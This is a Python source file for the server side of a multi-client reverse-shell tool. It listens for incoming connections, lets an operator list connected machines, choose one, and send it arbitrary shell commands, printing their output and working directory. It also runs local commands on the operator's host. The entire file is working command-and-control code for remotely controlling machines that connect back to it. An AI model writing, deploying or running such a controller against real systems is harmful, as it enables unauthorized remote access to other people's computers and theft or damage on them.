import socket
import subprocess
from threading import Thread
import re
import os

import tabulate
import tqdm

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5004
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        # initialize the server socket
        self.server_socket = self.get_server_socket()
        # a dictionary of client addresses and sockets
        self.clients = {}
        # a dictionary mapping each client to their current working directory
        self.clients_cwd = {}
        # the current client that the server is interacting with
        self.current_client = None

    def get_server_socket(self, custom_port=None):
        # create a socket object
        s = socket.socket()
        # bind the socket to all IP addresses of this host
        if custom_port:
            # if a custom port is set, use it instead
            port = custom_port
        else:
            port = self.port
        s.bind((self.host, port))
        # make the PORT reusable, to prevent:
        # when you run the server multiple times in Linux, Address already in use error will raise
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"Listening as {SERVER_HOST}:{port} ...")
        return s

    def accept_connection(self):
        while True:
            # accept any connections attempted
            try:
                client_socket, client_address = self.server_socket.accept()
            except OSError as e:
                print("Server socket closed, exiting...")
                break
            print(f"{client_address[0]}:{client_address[1]} Connected!")
            # receiving the current working directory of the client
            cwd = client_socket.recv(BUFFER_SIZE).decode()
            print("[+] Current working directory:", cwd)
            # add the client to the Python dicts
            self.clients[client_address] = client_socket
            self.clients_cwd[client_address] = cwd

    def accept_connections(self):
        # start a separate thread to accept connections
        self.connection_thread = Thread(target=self.accept_connection)
        # and set it as a daemon thread
        self.connection_thread.daemon = True
        self.connection_thread.start()

    def close_connections(self):
        """Close all the client sockets and server socket.
        Used for closing the program"""
        for _, client_socket in self.clients.items():
            client_socket.close()
        self.server_socket.close()

    def start_interpreter(self):
        """Custom interpreter"""
        while True:
            command = input("interpreter $> ")            
            if re.search(r"list\w*", command):
                # list all the connected clients
                connected_clients = []
                for index, ((client_host, client_port), cwd) in enumerate(self.clients_cwd.items()):
                    connected_clients.append(
                        [index, client_host, client_port, cwd])
                # print the connected clients in tabular form
                print(tabulate.tabulate(connected_clients,
                      headers=["Index", "Address", "Port", "CWD"]))
            elif (match := re.search(r"use\s*(\w*)", command)):
                try:
                    # get the index passed to the command
                    client_index = int(match.group(1))
                except ValueError:
                    # there is no digit after the use command
                    print("Please insert the index of the client, a number.")
                    continue
                else:
                    try:
                        self.current_client = list(self.clients)[client_index]
                    except IndexError:
                        print(
                            f"Please insert a valid index, maximum is {len(self.clients)}.")
                        continue
                    else:
                        # start the reverse shell as self.current_client is set
                        self.start_reverse_shell()
            elif command.lower() in ["exit", "quit"]:
                # exit out of the interpreter if exit|quit are passed
                break
            elif command == "":
                # do nothing if command is empty (i.e a new line)
                pass
            else:
                print("Unavailable command:", command)
        self.close_connections()

    def start(self):
        """Method responsible for starting the server: 
        Accepting client connections and starting the main interpreter"""
        self.accept_connections()
        self.start_interpreter()

    def start_reverse_shell(self):
        # get the current working directory from the current client
        cwd = self.clients_cwd[self.current_client]
        # get the socket too
        client_socket = self.clients[self.current_client]
        while True:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            if (match := re.search(r"local\s*(.*)", command)):
                local_command = match.group(1)
                if (cd_match := re.search(r"cd\s*(.*)", local_command)):
                    # if it's a 'cd' command, change directory instead of using subprocess.getoutput
                    cd_path = cd_match.group(1)
                    if cd_path:
                        os.chdir(cd_path)
                else:
                    local_output = subprocess.getoutput(local_command)
                    print(local_output)
                # if it's a local command (i.e starts with local), do not send it to the client
                continue
            # send the command to the client
            client_socket.sendall(command.encode())
            if command.lower() in ["exit", "quit"]:
                # if the command is exit, just break out of the loop
                break
            elif command.lower() == "abort":
                # if the command is abort, remove the client from the dicts & exit
                del self.clients[self.current_client]
                del self.clients_cwd[self.current_client]
                break            
            # retrieve command results
            output = self.receive_all_data(client_socket, BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # update the cwd
            self.clients_cwd[self.current_client] = cwd
            # print output
            print(results)

        self.current_client = None

    def receive_all_data(self, socket, buffer_size):
        """Function responsible for calling socket.recv()
        repeatedly until no data is to be received"""
        data = b""
        while True:
            output = socket.recv(buffer_size)
            data += output
            if not output or len(output) < buffer_size:
                break
            # if len(output) < buffer_size:
            #     data += self.receive_all_data(socket, buffer_size)
        return data

    


if __name__ == "__main__":
    server = Server(SERVER_HOST, SERVER_PORT)
    server.start()
